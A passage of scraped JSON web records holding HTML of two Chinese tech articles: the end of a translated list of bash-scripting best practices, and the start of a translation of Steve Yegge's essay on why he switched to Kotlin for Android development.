class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvalue1=”tecmint.com”\r\nvalue2=”fossmint.com”\r\nif [ \"$value1\" = \"$value2\" ]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d22808566024-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d22808566024-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d22808566024-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d22808566024-1\"><span class=\"crayon-v\">value1</span><span class=\"crayon-o\">=</span>”<span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d22808566024-2\"><span class=\"crayon-v\">value2</span><span class=\"crayon-o\">=</span>”<span class=\"crayon-v\">fossmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span>”</div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d22808566024-3\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$value1\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$value2\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p></p>\n<h3 id=\"toc_7\">7、 用 <code>$(command)</code> 而不是老旧的 <code><code>command</code></code> 来做代换</h3>\n<p><a class=\"ext\" href=\"https://www.tecmint.com/assign-linux-command-output-to-variable/\" target=\"_blank\" rel=\"external nofollow\">命令代换</a> 是用这个命令的输出结果取代命令本身。用 <code>$(command)</code> 而不是引号 <code><code>command</code></code> 来做命令代换。</p>\n<p>这种做法也是 <a class=\"ext\" href=\"https://www.tecmint.com/shellcheck-shell-script-code-analyzer-for-linux/\" target=\"_blank\" rel=\"external nofollow\">shellcheck tool</a> （可针对 shell 脚本显示警告和建议）所建议的。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1d26665527037\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nuser=`echo “$UID”`\r\nuser=$(echo “$UID”)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d26665527037-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d26665527037-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d26665527037-1\"><span class=\"crayon-v\">user</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span>“<span class=\"crayon-sy\">$</span><span class=\"crayon-i\">UID</span>”<span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d26665527037-2\"><span class=\"crayon-v\">user</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span>“<span class=\"crayon-sy\">$</span><span class=\"crayon-i\">UID</span>”<span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">8、 用 <code>readonly</code> 来声明静态变量</h3>\n<p>静态变量不会改变；它的值一旦在脚本中定义后不能被修改：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1d29015186095\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nreadonly passwd_file=”/etc/passwd”\r\nreadonly group_file=”/etc/group”</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d29015186095-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d29015186095-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d29015186095-1\"><span class=\"crayon-e\">readonly </span><span class=\"crayon-v\">passwd_file</span><span class=\"crayon-o\">=</span>”<span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">passwd</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d29015186095-2\"><span class=\"crayon-e\">readonly </span><span class=\"crayon-v\">group_file</span><span class=\"crayon-o\">=</span>”<span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">group</span>”</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_9\">9、 环境变量用大写字母命名，而自定义变量用小写</h3>\n<p>所有的 bash 环境变量用大写字母去命名，因此用小写字母来命名你的自定义变量以避免变量名冲突：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1d2d180224620\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# 定义自定义变量用小写，而环境变量用大写\r\nnikto_file=”$HOME/Downloads/nikto-master/program/nikto.pl”\r\nperl “$nikto_file” -h  “$1”</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d2d180224620-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bbf1ab1d2d180224620-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bbf1ab1d2d180224620-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d2d180224620-1\"><span class=\"crayon-p\"># 定义自定义变量用小写，而环境变量用大写</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bbf1ab1d2d180224620-2\"><span class=\"crayon-v\">nikto_file</span><span class=\"crayon-o\">=</span>”<span class=\"crayon-sy\">$</span><span class=\"crayon-v\">HOME</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Downloads</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nikto</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">master</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">program</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nikto</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pl</span>”</div><div class=\"crayon-line\" id=\"crayon-594bbf1ab1d2d180224620-3\"><span class=\"crayon-i\">perl</span><span class=\"crayon-h\"> </span>“<span class=\"crayon-sy\">$</span><span class=\"crayon-v\">nikto</span><span class=\"crayon-sy\">_</span>file”<span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">h</span><span class=\"crayon-h\">  </span>“<span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span>”</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h3 id=\"toc_10\">10、 总是对长脚本进行调试</h3>\n<p>如果你在写有数千行代码的 bash 脚本，排错可能变成噩梦。为了在脚本执行前易于修正一些错误，要进行一些调试。通过阅读下面给出的指南来掌握此技巧：</p>\n<ol>\n<li><a href=\"https://linux.cn/article-8028-1.html\">如何在 Linux 中启用 Shell 脚本调试模式</a></li>\n<li><a href=\"https://linux.cn/article-8045-1.html\">如何在 Shell 脚本中执行语法检查调试模式</a></li>\n<li><a href=\"https://linux.cn/article-8120-1.html\">如何在 Shell 脚本中跟踪调试命令的执行</a></li>\n</ol>\n<p>本文到这就结束了，你是否有一些其他更好的 bash 脚本编程经验想要分享？若是的话，在下面评论框分享出来吧。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111514\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111514votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111514\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["https://dn-linuxcn.qbox.me/data/attachment/album/201706/17/192227q13jnz3eeqq5pb53.png"], "fav_nums": 6, "comment_nums": 0, "create_date": "2017/06/19", "praise_nums": 1}
{"tags": "Kotlin, 6 评论 ,开发,Steve Yegge", "front_image_path": "full/58c8f6bdcba8e16863b39c2cc43c3203d1887c67.jpg", "title": "谷歌大牛说：为什么 Kotlin 比你们用的那些垃圾语言都好", "url_object_id": "e1424ea1775d8a39ee3e2c46397ddc08", "url": "http://blog.jobbole.com/111249/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/huangxiaofei\">黄小非</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://steve-yegge.blogspot.com/2017/05/why-kotlin-is-better-than-whatever-dumb.html\">Steve Yegge</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：5月18日，安卓团队在谷歌 I/O 2017 大会上宣布 Kotlin 成为官方头等支持语言。这条爆炸性资讯在当天就是 Hacker News 首页热门讨论，与此同时，谷歌技术大牛 Steve Yegge 也写了一篇关于 Kotlin 的使用体会总结文章，同样也在首页热门，并<a href=\"https://news.ycombinator.com/item?id=14362975\" target=\"_blank\">引发 200+ 讨论</a>。伯乐在线编译如下。</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1ffu5zuwglij20dw099406.jpg\"></p>\n<p style=\"text-align: center;\">（Steve Yegge ）</p>\n<h3>为什么说 Kotlin 比你们用的那些垃圾语言都好</h3>\n<p>哈，这个标题党的题目让你点进来看了吧。不要奇怪，现在标题党在网上很普遍的。而且这篇文章给出的回答，肯定能震撼到你。</p>\n<p>说真的，其实我不想去攻击你们的语言信仰……至少不会“大大地”想。毕竟你喜欢的语言大放异彩的时期，可能要追溯到冰川时代了，对不？如果你喜欢的语言到今天还没有死，那只能说明这门语言在逐渐地改进和更新，保持与时俱进。</p>\n<p>但改进的速度呢？好吧……假设你现在用的语言碰巧是 Java，并且你也沉溺于 Java 曾经是一门非常优秀的语言的想法，那么你就完蛋了。而且是早就完蛋了。尽管人类都不太喜欢思考终极命运问题，但是相比于在 20 多年前刚刚问世，Java 8 仅仅是做了部分语言特性的替换，对此你禁不住要想：“我真的要和这种语言来共度过的余生么？还是说 Java 也就只能这样了？”</p>\n<p>因为终于要开始做 Android 开发了，我把各种老旧的语言问题又过了一遍。我写过一个老游戏 <a href=\"http://reddit.com/r/wyvernrpg\">Wyvern</a>，这个游戏已经有一个 iOS 版本了，最近我决定再搞一个 Android 版本。我从来没料到计算机语言会折腾到让我“思考人生”（例如“我这是他娘的在浪费生命么？”）如果你写过 Android 程序的话，你就知道在 Android 领域，语言的问题是会让你相当难熬的。</p>\n<p>我第一次尝试写 Android 程序是在去年夏天，我的个老天爷，那感觉简直糟透了。其实是有人警告过我的。他们都说：“那些 API 可是很难搞啊。”而我却不听劝。一意孤行。</p>\n<p>我想：这些玩意儿能糟糕到哪儿去呢？反正不就是 Java 么？</p>\n<h3>历史代码的灾难</h3>\n<p>真是很不走运——因为很复杂的历史原因，并且也没人在意——造成 Android 的核心 API 实在是糟糕透顶。我是说：真的很糟，真的很糟，真的很糟。你只能关掉参考书，深呼吸，然后出去猛喝咖啡来压压惊。人们之前给我的告诫看来是完全正确的。</p>\n<p>Android API 库就是一个百宝箱。很多 API 真的是非常好用。我可以说，很多在 iOS 开发里非常难搞的事情在 Android 里面却很容易。Product flavors、Downloads 服务、findViewById() 方法、Preferences activity 等等，这些都是很好的例子。有太多 Android 里面有的东西在 iOS 里面是诶有的，所以在 iOS 里面你总能看到：开发者自己实现的恶心的和优雅的应用库并存。</p>\n<p><strong>但是</strong>！注意左边是一个大写加粗的但是！在写 Android 程序的时候，人们只关注那些不好的 API，就像你开车时候只会数路上遇到了几个红灯一样，绿灯的数量是没人关心的。因为人们只会通过红灯的数量来评价路途是否通顺。</p>\n<p>Android 确实有几个很糟糕的“红灯”API。例如 Fragments，这就是在 Andoird “红灯” API 中的招牌 API。这个 API 的整个生命周期的糟糕程度达到了令人发指的地步，好吧其实 Activities 和 Fragments 都是如此。说句不中听的，iOS 反而却没有这么糟糕的API。去年夏天我试了试这些API，它们是如此之糟糕以至于我当时就放弃了。我算是彻底服了。去它的，我还是以后找个人来帮我写这些程序吧。</p>\n<p>接下来的一年半，我就没再碰过 Android 编程。</p>\n<h3>来自俄罗斯的救星</h3>\n<p style=\"text-align: left;\">我一直听说，有一种新语言叫做 Kotlin，可以用来写基于 JVM 或者 Android 程序。发明这种语言的不是别国，正是战斗的民族俄罗斯。更具体一点儿，它是由 JetBrains 开发。JetBrains 可是世界知名的 IDE 开发商，代表作是 Intellij IDEA，还有他们那可爱而且大名鼎鼎的橘色，绿色，紫色和黑色混合的暗色“Darcula”主题。</p>\n<p style=\"text-align: center;\"><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fftzgxa728j20ic0b0wom.jpg\" width=\"660\" height=\"396\"></p>\n<p style=\"text-align: center;\"><em>图：一个千年老妖按捺不住对 Java 8 的兴奋</em></p>\n<p>那么为什么要给这种语言起名叫 Kotlin 呢？好吧，有一种说法是因为 Java 的第一个字母是“J”，而 Kotlin 则用了Java 的下一个字母“K”作为开头。除此之外，有人还猜想（这种猜想可能来自加州大学伯克利分校），“Kotlin”这个名字的灵感还来源于“克里姆林宫”，“赫鲁晓夫”以及“克格勃”。这些都是前苏联的骄傲，所以他们就用了一个前苏联军事基地的名字“Kotlin”来命名这种语言。总之这个名字不错，而且你会习惯它的。</p>\n<blockquote><p>伯乐在线补充：Steve Yegge 在前文关于 Kotlin 的名字来源，应该错了。在他自己原文评论中，也有网友指出了。</p>\n<p>正确的应该是：① JetBrains 是一家注册地在捷克布拉格的公司，在全球共有 6 个办公点：布拉格、圣彼得堡、莫斯科、波士顿、慕尼黑和新西伯利亚。但主要管理层和开发者是在圣彼得堡。② 芬兰湾中有个岛就是「Kotlin/科特林」，在圣彼得堡以西 32 公里。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fftze72i5xj20mr0c1grh.jpg\"></p></blockquote>\n<p>我发现去年业界关于 Kotlin 只是有不少“嘀咕（buzz）”。注意，只是“嘀咕”，不是天花乱坠地吹牛宣传。人们只是低调地“嘀咕”着。好吧，总之，我当时看了一下，然后就觉得这个语言和我过去 15 年看过的 50 ~ 100 种计算机语言一样，这也是一门可以替代 Java 的语言，当然，我认为任何理性的语言都能替代 Java。</p>\n<h3>对 Kotlin 的第一印象</h3>\n<p>我第一次看到 Kotlin 的时候，真心觉得这种语言不可能在现实生活中用到，真的是一点可能性都没有。其实我也就是走马观花。我的第一印象？这个语言也没什么大问题。它很简洁，也具有先进的特性。如果说它时髦也行，因为它几乎囊括了计算机语言设计上的所有最新潮流。不过这也没什么大不了，因为很多语言也都满足这一点。比如，Rust。Rust 也是一门健壮的，名字起得很好的，但是没什么人用的语言。</p>\n<p>Kotlin 给我的一种奇怪的感觉是“似曾相识”，后来我才反应过来，原来这是因为它和 Swift 很像。我之所以没有马上反应过来，是因为我的 iOS 程序因为历史代码的原因不得不用 Objective-C 而不是 Swift 来写。当然现在我也弄明白了：其实 Kotlin 的历史比 Swift 要悠久几年，所以正确的说法应该是：<a href=\"http://mp.weixin.qq.com/s?__biz=MjM5OTA1MDUyMA==&amp;mid=2655438427&amp;idx=2&amp;sn=ed5433de4a067d6aae2facd6dd094ec2&amp;chksm=bd730a2c8a04833ad8f44780d12ea1fb18503472397daec8645aa3d0fe316c58e61fa7c83d69#rd\" target=\"_blank\">Swift 和 Kotlin 很像</a>。</p>\n<p>不过即便如此我当时也没准备用这种语言干活。Kotlin 对我来说确实是一种语法优雅的语言，但是我觉得我对这门语言还没有掌握到足够的程度，以至于让我可以用它来应付残酷的现实工作。</p>\n<h3>从 Java 叛逃到 Kotlin</h3>\n<p>我不太记得我是具体怎么爱上 Kotlin 的了。但是我敢肯定的是这绝对不是有意为之。</p>\n<p>我努力回忆了一下，事情是这样的，我做的那个游戏的玩家跟我说了好久，让我开发一个 Android 版本。这个游戏是 12 月份在 Apple Store 上架的，然后几周之内，大量粉丝就跟我说，他们是 Andorid 用户，所以没法玩到这个游戏。所以，尽管我已经“发誓”再也不碰Android 编程了，但是用户就是上帝，所以我又开始尝试了。不过这一次要换个玩儿法——不能再把胃口坏在 Android 的 Java 语言上了。我需要有个现成的框架，或者什么类似的东西，来让工作变得简单一点儿。</p>\n<p>在 1 月中旬，我做了一个粗略评估，然后就决定用 Kotlin 来开发了，Kotlin 当时可同时支持 Dalvik 和 Art 两种 Android 虚拟机。我觉得我的评估是基于以下几个原因：</p>\n<ul>\n<li>1. Kotlin 已经小有名气；</li>\n<li>2. 当时我写 iOS 版的时候就想用 Swift（但是没用成）；</li>\n<li>3. Kotlin有一种挺不错的 Android DSL 叫做 Anko，这勾起了我的兴趣，虽然最后我并没有真的用到它。</li>\n</ul>\n<p>所以我就用 Kotlin 开始做了。在接下来的 4-5 周内，我用 Kotlin 重写了游戏的服务平台。要知道这个平台之前已经有 20 多年历史了。用了一个月的 Kotlin，我就被完全征服了。我不是要说 Scala 或者其他语言的坏话，但是对我这种普通码农来说，Koltin 是完美的。我的要求不高，给口饭吃就行，知道不？Scala 固然很好，但是它好得过头了，就像牛蛙\\牛脑\\松露蜗牛这些高档菜那么好。要知道我就是个蓝领，Clojure、Scala 这类的语言对我来说太高大上了。</p>\n<p>我大约花了 3 天时间来学习 Kotlin 的各种语法，然后就开始正式编程了，虽然我还是很不熟练，但是我知道这种语言和 IDE 工具足以让我解决各种麻烦。</p>\n<p>当我对这种语言稍微熟悉了一些以后，我就知道，我应该不会再去爱上另外一种语言了，因为 Kotlin 实在是太迷人了。你在代码写出来的东西让你觉得很酷。当然我以前用其他的语言编程的时候也体验过类似的感觉，但是<strong>那些语言的学习曲线一般都非常陡峭</strong>。Kotlin呢，它就是大救星：当 Java 程序员为了 Java 8 弄出来的一大堆新概念挠头的时候，Kotlin 出现了。Kotlin 能实现 Java 8 的各种新特性，并且通过对 coroutines 的支持，其实能实现更强大的功能，而且语法表现力更简洁。Java 8 确实也能表达很有意思的逻辑，但是很繁琐，感觉就像让你说话之前要先给你嘴里塞沙子。</p>\n<p>我想 Kotlin 上手很容易的原因太显而易见了，要归功于它的 IDE 支持。现在几乎所有的 JVM 语言或者 Android 语言的 IDE 支持都是由社区的几个志愿者在维护（当然 Java 除外）。而 Kotlin 则是来自世界级的 IDE 厂商（Jetbrains），所以 Kotlin 打一开始就是自带 IDE 支持的。有多少语言能做到从发明伊始就能有 IDE 支持呢？编程语言的进化历程一般做不到这一点。况且有的编程语言从一开始就是要避开 IDE 这个因素的（Hi！Rob）另外一个能一开始就做到 IDE 支持的语言就是 C#，当然 C# 毫无疑问是全世界最好的编程语言之一。</p>\n<blockquote><p>伯乐在线译注：上面这段中的 Rob，应该是指 Go 语言的发明者 Rob Pike，作者在这里也许是暗讽 Go 语言从发明到现在都没有一个靠谱的 IDE 支持吧。</p></blockquote>\n<p>作为一个自带 IDE 支持的语言，你在 Kotlin buffer 敲代码的时候，打字基本对就可以了。IDE 会帮你补全你没写完的部分。你知道吗，你甚至可以把Java代码复制到IDE里面，然后 IDE 会帮你自动转换成Kotlin代码。如果你觉得 Java 的 IDE 都还不错，那么我可以很荣幸地告诉你，Kotlin IDE 会把这种“不错”推进到前所未有的地步。甚至有一个前微软工程师跟我说：“我本以为微软的 Visual Studio 是 IDE 界的标杆，是不可超越的。但是我觉得 IntelliJ IDEA 的确要更好。”在我看来，因为我对 Visual Studio 不熟悉，所以我在这里只是引用他说的话。不过我认为 IntelliJ IDEA 至少和 VS 是同等水平。</p>\n<p>诚然，在现实工作中我还是要经常切换到 Emacs 的。IntelliJ 